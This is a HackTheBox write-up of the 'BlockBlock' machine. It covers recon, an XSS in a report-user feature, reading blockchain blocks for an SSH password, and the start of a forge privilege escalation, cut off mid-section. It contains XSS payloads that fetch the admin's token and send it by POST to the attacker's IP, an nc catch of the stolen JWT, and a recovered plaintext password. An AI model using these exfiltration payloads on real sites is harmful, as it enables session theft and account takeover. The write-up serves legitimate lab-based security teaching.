---
title: HTB: BlockBlock
url: https://0xdf.gitlab.io/2025/03/29/htb-blockblock.html
date: 2025-03-29T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-blockblock, ctf, nmap, arch, blockchain, solidity, smart-contract, flask, burp, burp-repeater, html-injection, xss, cyberchef, forge, foundry, arbitrary-write, path-hijack, github, source-code, pacman, htb-alert
---

![BlockBlock](/img/blockblock-cover.png)

BlockBlock offers a chat application where the database is built on the blockchain using smart contracts. I’ll abuse a cross-site scripting vulnerability along with an api endpoint that reflects the user’s authentication cookie to get access to the admin’s account. From there, I’ll figure out how to make JSON RPC calls against the local Etherium instance, and read the raw blocks of the blockchain to find a password that provides SSH access. The user can run forge as another user, which I’ll abuse three ways to get execution and a shell as that second user. That user can run the pacman, the package manager for Arch Linux, as root. I’ll show several different ways to abuse this to get root.

## Box Info

| Name | [BlockBlock](https://hackthebox.com/machines/blockblock)  [BlockBlock](https://hackthebox.com/machines/blockblock) [Play on HackTheBox](https://hackthebox.com/machines/blockblock) |
| --- | --- |
| Release Date | [16 Nov 2024](https://twitter.com/hackthebox_eu/status/1857106259834532211) |
| Retire Date | 29 Mar 2025 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for BlockBlock |
| Radar Graph | Radar chart for BlockBlock |
| First Blood User | 05:19:00[Knorrke Knorrke](https://app.hackthebox.com/users/585896) |
| First Blood Root | 13:48:40[Knorrke Knorrke](https://app.hackthebox.com/users/585896) |
| Creator | [0xOZ 0xOZ](https://app.hackthebox.com/users/863918) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22) and two HTTP servers (80, 8545):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.43
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 12:01 UTC
Nmap scan report for 10.10.11.43
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
oxdf@hacky$ nmap -p 22,80,8545 -sCV 10.10.11.43
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 12:03 UTC
Nmap scan report for 10.10.11.43
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7 (protocol 2.0)
| ssh-hostkey:
|   256 d6:31:91:f6:8b:95:11:2a:73:7f:ed:ae:a5:c1:45:73 (ECDSA)
|_  256 f2:ad:6e:f1:e3:89:38:98:75:31:49:7a:93:60:07:92 (ED25519)
80/tcp   open  http    Werkzeug/3.0.3 Python/3.12.3
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title:          Home  - DBLC
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 15 Mar 2025 12:05:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 275864
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     Home - DBLC
|     </title>
|     <link rel="stylesheet" href="/assets/nav-bar.css">
|     </head>
|     <body>
|     <!-- <main> -->
|     <meta charset=utf-8>
|     <meta name=viewport content="width=device-width, initial-scale=1">
|     <style>
|     :after,
|     :before {
|     box-sizing: border-box;
|     border: 0 solid #e5e7eb
|     :after,
|     :before {
|     --tw-content: ""
|     :host,
|     html {
|     line-height: 1.5;
|   HTTPOptions:
|     HTTP/1.1 500 INTERNAL SERVER ERROR
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 15 Mar 2025 12:05:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 265
|     Access-Control-Allow-Origin: http://0.0.0.0/
|     Access-Control-Allow-Headers: Content-Type,Authorization
|     Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>500 Internal Server Error</title>
|     <h1>Internal Server Error</h1>
|_    <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
8545/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 400 BAD REQUEST
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 15 Mar 2025 12:05:16 GMT
|     content-type: text/plain; charset=utf-8
|     Content-Length: 43
|     vary: origin, access-control-request-method, access-control-request-headers
|     access-control-allow-origin: *
|     date: Sat, 15 Mar 2025 12:05:16 GMT
|     Connection: close
|     Connection header did not include 'upgrade'
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Sat, 15 Mar 2025 12:05:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: POST, GET, HEAD, OPTIONS
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Connection: close
|   Help:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=3/15%Time=67D56C8A%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,3004,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\x
SF:20Python/3\.12\.3\r\nDate:\x20Sat,\x2015\x20Mar\x202025\x2012:05:16\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20275864\r\nAccess-Control-Allow-Origin:\x20http://0\.0\.0\.0/\r\nAcce
SF:ss-Control-Allow-Headers:\x20Content-Type,Authorization\r\nAccess-Contr
SF:ol-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS\r\nConnection:\x20clos
SF:e\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\n<head>\n\x20\x20\x20\x20<title>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20Home\x20\x20-\x20DBLC\n\x20\x20\x2
SF:0\x20</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/a
SF:ssets/nav-bar\.css\">\n</head>\n\n<body>\n\x20\x20\x20\x20\n\n\x20\x20\
SF:x20\x20<!--\x20<main>\x20-->\n\x20\x20\x20\x20\n\x20\x20\x20\x20<meta\x
SF:20charset=utf-8>\n\x20\x20\x20\x20<meta\x20name=viewport\x20content=\"w
SF:idth=device-width,\x20initial-scale=1\">\n\x20\x20\x20\x20<style>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\*,\n\x20\x20\x20\x20\x20\x20\x20\x20:after
SF:,\n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20box-sizing:\x20border-box;\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20border:\x200\x20solid\x20#e5e7eb\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:after,\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20:before\x20{\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20--tw-content:\x20\"\"\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20:host,\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20line-height:\x201\.5;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20")%r(H
SF:TTPOptions,26D,"HTTP/1\.1\x20500\x20INTERNAL\x20SERVER\x20ERROR\r\nServ
SF:er:\x20Werkzeug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2015\x20Ma
SF:r\x202025\x2012:05:16\x20GMT\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nContent-Length:\x20265\r\nAccess-Control-Allow-Origin:\x20http
SF:://0\.0\.0\.0/\r\nAccess-Control-Allow-Headers:\x20Content-Type,Authori
SF:zation\r\nAccess-Control-Allow-Methods:\x20GET,POST,PUT,DELETE,OPTIONS\
SF:r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<
SF:title>500\x20Internal\x20Server\x20Error</title>\n<h1>Internal\x20Serve
SF:r\x20Error</h1>\n<p>The\x20server\x20encountered\x20an\x20internal\x20e
SF:rror\x20and\x20was\x20unable\x20to\x20complete\x20your\x20request\.\x20
SF:Either\x20the\x20server\x20is\x20overloaded\x20or\x20there\x20is\x20an\
SF:x20error\x20in\x20the\x20application\.</p>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8545-TCP:V=7.94SVN%I=7%D=3/15%Time=67D56C8A%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,174,"HTTP/1\.1\x20400\x20BAD\x20REQUEST\r\nServer:\x20Werkz
SF:eug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2015\x20Mar\x202025\x2
SF:012:05:16\x20GMT\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x2043\r\nvary:\x20origin,\x20access-control-request-metho
SF:d,\x20access-control-request-headers\r\naccess-control-allow-origin:\x2
SF:0\*\r\ndate:\x20Sat,\x2015\x20Mar\x202025\x2012:05:16\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\nConnection\x20header\x20did\x20not\x20include\x20'
SF:upgrade'")%r(HTTPOptions,ED,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkz
SF:eug/3\.0\.3\x20Python/3\.12\.3\r\nDate:\x20Sat,\x2015\x20Mar\x202025\x2
SF:012:05:16\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAll
SF:ow:\x20POST,\x20GET,\x20HEAD,\x20OPTIONS\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTS
SF:PRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x
SF:20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\
SF:x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20
SF:Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20req
SF:uest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</
SF:body>\n</html>\n")%r(Help,167,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\"
SF:>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20cha
SF:rset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respon
SF:se</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Message:\x20Bad\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x2
SF:0Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x2
SF:0\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.03 seconds

```

Based on the OpenSSH version looks similar to the [Debian trixie or sid](https://packages.debian.org/search?keywords=openssh-server) versions, but doesn’t quite match. The two webservers are Python Werkzerg (Flask).

### Website - TCP 80

#### Site

The website is for a “secure decentralized blockchain chat”:

![image-20250316161045481](/img/image-20250316161045481.png)

Trying to visit the “Chat” link goes to `/chat` which returns JSON that shows a failure for lack of auth:

![image-20250316161333764](/img/image-20250316161333764.png)

“Profile” looks exactly the same.

“Login” shows a login form:

![image-20250316161408089](/img/image-20250316161408089.png)

The forgot password link doesn’t work.

Filling out the registration form then redirects to `/chat`, which now loads:

![image-20250316161505152](/img/image-20250316161505152.png)

The “Report User” button pops an message box:

![image-20250317184710737](/img/image-20250317184710737.png)

Regardless of what I enter, it pops another:

![image-20250317184728926](/img/image-20250317184728926.png)

The link to “review our smart contracts” returns two `.sol` files in a JSON response:

![image-20250316161725944](/img/image-20250316161725944.png)

I’ll look at them [shortly](#smart-contracts).

#### Tech Stack

The HTTP response headers for the site show Python Werkzeug, which is likely Flask:

```

HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Sun, 16 Mar 2025 20:11:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 275864
Access-Control-Allow-Origin: http://10.10.11.43/
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Connection: close

```

There is a custom 404 page, so no hints there:

![image-20250317180548458](/img/image-20250317180548458.png)

On logging in, a cookie named `token` is set:

![image-20250324122400035](/img/image-20250324122400035.png)

It’s a JWT, with nothing too interesting or suspicious, but worth noting that it is `HttpOnly`, which means I won’t be able to get it directly via XSS.

#### Messages API

Every few seconds the `/chat` site is sending a GET request to `/api/recent_messages`, which returns JSON for recent messages:

![image-20250316161624835](/img/image-20250316161624835.png)

Trying to run a brute force errors out very quickly and gets stuck, so I’ll kill it and move on.

#### TCP 8545

On loading `/` there’s immediately two calls to the service on TCP 8545:

![image-20250317184013667](/img/image-20250317184013667.png)

The response to the POST request is JSON data:

```

{"jsonrpc":"2.0","id":1,"result":"0xc"}

```

It continues to make the OPTIONS request followed by the POST every 10 seconds. The `result` field is the value that shows up at the bottom right corner of the page (0xc = 12):

![image-20250317184229258](/img/image-20250317184229258.png)

#### /api/info

In trying to load the main page, it requests `/api/info`, which returns a 401 UNAUTHORIZED:

```

HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Mon, 17 Mar 2025 22:40:57 GMT
Content-Type: application/json
Content-Length: 35
Access-Control-Allow-Origin: http://10.10.11.43/
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Connection: close

{"msg":"Missing cookie \"token\""}

```

Once I register an account, it makes the same request, and this time it works:

```

HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Mon, 17 Mar 2025 22:45:19 GMT
Content-Type: application/json
Content-Length: 313
Access-Control-Allow-Origin: http://10.10.11.43/
Access-Control-Allow-Headers: Content-Type,Authorization
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Connection: close

{"role":"user","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjI1MTUxOSwianRpIjoiNzMzNjI4YzktZDQxZC00NTUxLWJkMzUtNjU4NDgwZDU5ZjI2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6IjB4ZGYiLCJuYmYiOjE3NDIyNTE1MTksImV4cCI6MTc0Mjg1NjMxOX0.0pJUBOKrXQ8DCEh9hNfgAADqVux_sUf9fnD8DUUilaE","username":"0xdf"}

```

The `token` value is the same token from the cookie in the request:

![image-20250317184554046](/img/image-20250317184554046.png)

### Etherium RPC - TCP 8545

TCP 8545 is the default port for the [Etherium JSON-RPC](https://ethereum.org/en/developers/docs/apis/json-rpc/). Visiting it returns an error:

```

HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Mon, 17 Mar 2025 23:07:16 GMT
content-type: text/plain; charset=utf-8
Content-Length: 43
vary: origin, access-control-request-method, access-control-request-headers
access-control-allow-origin: *
date: Mon, 17 Mar 2025 23:07:16 GMT
Connection: close

Connection header did not include 'upgrade'

```

It seems to be wanting to upgrade to a websocket. If I try to hit the example endpoint from that documentation, it fails:

```

oxdf@hacky$ curl -H "Content-Type: application/json" -X POST --data '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67}' 10.10.11.43:8545
{"error":"Proxy Couldn't verify token"}

```

If I use the `method` from the site, it does work:

```

oxdf@hacky$ curl -H "Content-Type: application/json" -X POST --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":67}' 10.10.11.43:8545
{"jsonrpc":"2.0","id":67,"result":"0xd"}

```

There’s not much else I can do here without a token.

### Smart Contracts

#### Background

`.sol` files in this context are Solidity files, a [programming language](https://soliditylang.org/) designed for Etherium smart contracts. I’ve looked at Solidity contracts a few times before, most recently in the l33t “[Santa’s Proxy Puzzle](/hackvent2024/leet#hv2412)” challenge in Hackvent 2024.

The `.sol` file is the source code that defines smart contracts on the Ethereum blockchain, containing the rules and logic governing an application.

#### Download

To download the contacts, I’ll use `curl`, grabbing my `token` cookie from Burp:

```

oxdf@hacky$ curl -s http://10.10.11.43/api/contract_source -b "token=$token" | jq '."Database.sol"' -r > Database.sol
oxdf@hacky$ curl -s http://10.10.11.43/api/contract_source -b "token=$token" | jq '."Chat.sol"' -r > Chat.sol

```

#### Database.sol

This file defines a contract named `Database` that manages user accounts. There’s a `User` struct:

```

    struct User {
        string password;
        string role;
        bool exists;
    }

```

There are functions for registration, deleting, and updating the password for users. For example, `registerAccount`:

```

    function registerAccount(
        string memory username,
        string memory password
    ) public onlyOwner {
        if (
            keccak256(bytes(users[username].password)) != keccak256(bytes(""))
        ) {
            revert("Username already exists");
        }
        users[username] = User(password, "user", true);
        emit AccountRegistered(username);
    }

```

It makes sure that the password isn’t empty, and then creates the `User` object with the username and password.

`updatePassword` is similar:

```

   function updatePassword(
        string calldata username,
        string calldata oldPassword,
        string calldata newPassword
    ) public onlyOwner onlyExistingUser(username) {
        if (
            keccak256(bytes(users[username].password)) !=
            keccak256(bytes(oldPassword))
        ) {
            revert("Invalid password");
        }

        users[username].password = newPassword;
        emit PasswordUpdated(username);
    }

```

It’s not at all clear to me why hashing is only used when comparing after the plaintext password is pulled from the database. Maybe that’s just a mistake by the developer (and one I’ll exploit later).

The `getAccount` function takes a username and returns the username, password, and role.

```

    function getAccount(
        string calldata username
    )
        public
        view
        onlyOwner
        onlyExistingUser(username)
        returns (string memory, string memory, string memory)
    {
        return (username, users[username].password, users[username].role);
    }

```

So there’s no password verification done in it.

#### Chart.sol

`Chat.sol` defines a contract for chat messages, using the `Database` contract defined above for authentication and user management.

There is a `Message` struct:

```

    struct Message {
        string content;
        string sender;
        uint256 timestamp;
    }

```

There are functions to get messages by user in different ways. Nothing too interesting here.

#### Attacks

At this point, I don’t see any vulnerabilities in the contracts. The only slightly insecure thing is that the passwords seem to be stored in plaintext.

I could connect to the blockchain and create instances of these contracts, or find the one used by the site, but I don’t have any authentication information yet.

## Shell as keira

### Get Admin Cookie

#### HTML Injection POC

In the chat, there’s a button to report a user:

![image-20250324121519462](/img/image-20250324121519462.png)

I’ll try sending an HTML payload to see if it gets rendered anywhere downstream:

![image-20250324121616459](/img/image-20250324121616459.png)

I’ll send this, and a few seconds later there’s a hit on my Python webserver from BlockBlock:

```
10.10.11.43 - - [24/Mar/2025 16:17:29] code 404, message File not found
10.10.11.43 - - [24/Mar/2025 16:17:29] "GET /img.png HTTP/1.1" 404 -

```

That means my message was presented without sanitization to the admin and loaded as HTML.

#### XSS POC

I’ll update this payload to try for cross-site scripting (XSS) by making the `src` invalid and setting an `onerror` with some JavaScript:

```

<img src="x" onerror="fetch('http://10.10.14.6/xss')" />

```

Send this does result in a fetch:

```
10.10.11.43 - - [24/Mar/2025 16:18:50] code 404, message File not found
10.10.11.43 - - [24/Mar/2025 16:18:50] "GET /xss HTTP/1.1" 404 -

```

That means that my JavaScript was executed on their machine!

#### Recover Token

During enumeration, I [noted](#tech-stack) that the cookie was `HttpOnly`, which means I can’t use `document.cookie` to get the admin’s cookie. I also [noted](#apiinfo) the `/api/info` endpoint which leaks the current user’s token. I’ll write a payload to fetch this.

```

<img src="x" onerror="fetch('/api/info').then(resp => resp.text()).then(body => { fetch('http://10.10.14.6/exfil', { method: 'POST', body: body});})" />

```

This will get `/api/info` from the current site, and then send the response in a POST request back to me, much like I did last week in [Alert](/2025/03/22/htb-alert.html#arbitrary-file-read). I’ll just run `nc` on 80 to catch the response. A couple seconds after sending this I’ll get this:

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.43 59836
POST /exfil HTTP/1.1
Host: 10.10.14.6
Connection: keep-alive
Content-Length: 316
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.10.11.43
Referer: http://10.10.11.43/
Accept-Encoding: gzip, deflate

{"role":"admin","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjgzNTQyNywianRpIjoiYTE0MDE5NTQtYzBmZi00N2U5LWJkZTItYjE4MDMyZjdlM2RhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQyODM1NDI3LCJleHAiOjE3NDM0NDAyMjd9.NaU29rgOFPgeaCIWaf7XtBoTCHsuVSNUTmw9HSYmwrY","username":"admin"}

```

#### Site

I’ll set this as my cookie in the browser dev tools and reload the main page:

![image-20250324132436344](/img/image-20250324132436344.png)

There’s an additional option in the nav bar. Clicking goes to `/admin`:

![image-20250324132519421](/img/image-20250324132519421.png)

The Posts section has the recent posts:

![image-20250324132536515](/img/image-20250324132536515.png)

Users offers a select field with two users (and nothing else):

![image-20250324132558049](/img/image-20250324132558049.png)

### Get Raw Blockchain

#### Identify JSON RPC

The site is making a request to `/api/chat_address` and then the `/api/json-rpc` endpoint from the admin panel. The first request is a GET that returns a blockchain address:

![image-20250324134155085](/img/image-20250324134155085.png)

That result turns up as one of the parameters in the in the next call to the JSON RPC API:

```

POST /api/json-rpc HTTP/1.1
Host: 10.10.11.43
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.43/admin
Content-Type: application/json
token: ac39116c20b86db195ab49079f1c46d301f010d40d4e793dac76c57801a76220
Content-Length: 115
Origin: http://10.10.11.43
Connection: keep-alive
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjgzNTQyNywianRpIjoiYTE0MDE5NTQtYzBmZi00N2U5LWJkZTItYjE4MDMyZjdlM2RhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQyODM1NDI3LCJleHAiOjE3NDM0NDAyMjd9.NaU29rgOFPgeaCIWaf7XtBoTCHsuVSNUTmw9HSYmwrY
Priority: u=4

{"jsonrpc":"2.0","method":"eth_getBalance","params":["0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8","latest"],"id":1}

```

This is not the default JSON RPC, but it seems to be some kind of pass though using the Flask application. `eth_getBalance` is an [Etherium JSON RPC method](https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_getbalance). It seems to have both a `token` header as well as a cookie named `token`.

#### Get Blocks

There’s another function called `eth_getBlockByNumber` ([docs](https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_getblockbynumber)) that returns a raw block from the blockchain. It takes a number and a boolean, where the boolean is if I want the full transaction data.

I’ll give it “latest” for the number to get the most recent block, and `true` to get all the data:

![image-20250324134834345](/img/image-20250324134834345.png)

The latest block is 0xf, and it gives the input data in hex.

Given there’s only 16 blocks, I’ll step through them one by one, looking for interesting data in the input. In block 0x01, the input decodes to:

![image-20250324135029940](/img/image-20250324135029940.png)

This data is a binary format, but it has the username keira in it, followed after a bunch of nulls with a string that looks like a password!

### SSH

That password works for keira over SSH:

```

oxdf@hacky$ netexec ssh 10.10.11.43 -u keira -p SomedayBitCoinWillCollapse
SSH         10.10.11.43     22     10.10.11.43      [*] SSH-2.0-OpenSSH_9.7
SSH         10.10.11.43     22     10.10.11.43      [+] keira:SomedayBitCoinWillCollapse  Linux - Shell access!

```

I’ll connect with `ssh`:

```

oxdf@hacky$ sshpass -p SomedayBitCoinWillCollapse ssh keira@10.10.11.43
Last login: Mon Mar 24 14:16:50 2025 from 10.10.14.6
[keira@blockblock ~]$

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

And grab `user.txt`:

```

[keira@blockblock ~]$ cat user.txt
c835aa10************************

```

## Shell as paul

### Enumeration

#### OS

I had a hard time identifying the OS during [initial enumeration](#nmap). It turns out this system is running [Arch Linux](https://archlinux.org/):

```

[keira@blockblock ~]$ cat /etc/lsb-release 
DISTRIB_ID="Arch"
DISTRIB_RELEASE="rolling"
DISTRIB_DESCRIPTION="Arch Linux"
[keira@blockblock ~]$ uname -a
Linux blockblock 6.9.3-arch1-1 #1 SMP PREEMPT_DYNAMIC Fri, 31 May 2024 15:14:45 +0000 x86_64 GNU/Linux

```

#### Users

There are two users with home directories in `/home`:

```

[keira@blockblock home]$ ls
keira  paul

```

That matches the users with shells configured in `passwd`:

```

[keira@blockblock ~]$ cat /etc/passwd | grep "sh$"
root:x:0:0::/root:/usr/bin/bash
keira:x:1000:1000::/home/keira:/bin/bash
paul:x:1001:1001::/home/paul:/bin/bash

```

keira can run `forge` as paul:

```

[keira@blockblock ~]$ sudo -l
User keira may run the following commands on blockblock:
    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge

```

### RCE via forge

#### Background

[foundry](https://github.com/foundry-rs/foundry) describes itself as:

> Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.
>
> - Forge: Build, test, fuzz, debug and deploy Solidity contracts, like Hardhat, Brownie, Ape.
> - Cast: A Swiss Army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
> - Anvil: Fast local Ethereum development node, akin to Hardhat Network, Tenderly.
> - Chisel: Fast, utilitarian, and verbose Solidity REPL.

There’s a ton of documentation in the [Foundry Book](https://book.getfoundry.sh/), specially the [section on forge](https://book.getfoundry.sh/).

The `forge` command is the one keira can run as paul. `forge -h` will show the menu:

```

[keira@blockblock ~]$ sudo -u paul /home/paul/.foundry/bin/forge -h
Build, test, fuzz, debug and deploy Solidity contracts

Usage: forge <COMMAND>

Commands:
  bind               Generate Rust bindings for smart contracts
  build              Build the project's smart contracts [aliases: b, compile]
  cache              Manage the Foundry cache
  clean              Remove the build artifacts and cache directories [aliases: cl]
  clone              Clone a contract from Etherscan
  completions        Generate shell completions script [aliases: com]
  config             Display the current config [aliases: co]
  coverage           Generate coverage reports
  create             Deploy a smart contract [aliases: c]
  debug              Debugs a single smart contract as a script [aliases: d]
  doc                Generate documentation for the project
  flatten            Flatten a source file and all of its imports into one file [aliases: f]
  fmt                Format Solidity source files
  geiger             Detects usage of unsafe cheat codes in a project and its dependencies
  generate           Generate scaffold files
  generate-fig-spec  Generate Fig autocompletion spec [aliases: fig]
  help               Print this message or the help of the given subcommand(s)
  init               Create a new Forge project
  inspect            Get specialized information about a smart contract [aliases: in]
  install            Install one or multiple dependencies [aliases: i]
  remappings         Get the automatically inferred remappings for the project [aliases: re]
  remove             Remove one or multiple dependencies [aliases: rm]
  script             Run a smart contract as a script, building transactions that can be sent onchain
  selectors          Function selector utilities [aliases: se]
  snapshot           Create a snapshot of each test's gas usage [aliases: s]
  test               Run the project's tests [aliases: t]
  tree               Display a tree visualization of the project's dependency graph [aliases: tr]
  update             Update one or multiple dependencies [aliases: u]
  verify-bytecode    Verify the deployed bytecode against its source [aliases: vb]
  verify-check       Check verification status on Etherscan [aliases: vc]
  verify-contract    Verify smart contracts on Etherscan [aliases: v]

Options:
  -h, --help     Print help
  -V, --version  Print version

Find more information in the book: http://book.getfoundry.sh/reference/forge/forge.html

```

There are many ways to exploit this. I’ll show three:

```

flowchart TD;
    subgraph identifier[" "]
